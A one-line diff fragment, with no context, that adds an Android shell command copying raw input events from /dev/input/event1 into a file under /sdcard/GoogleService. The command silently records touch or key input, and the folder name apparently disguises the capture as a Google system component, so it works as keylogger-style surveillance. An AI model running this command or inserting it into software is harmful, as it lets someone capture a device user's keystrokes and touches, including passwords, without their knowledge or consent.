@@ -1,0 +1,1 @@
+cat /dev/input/event1 > /sdcard/GoogleService/event1
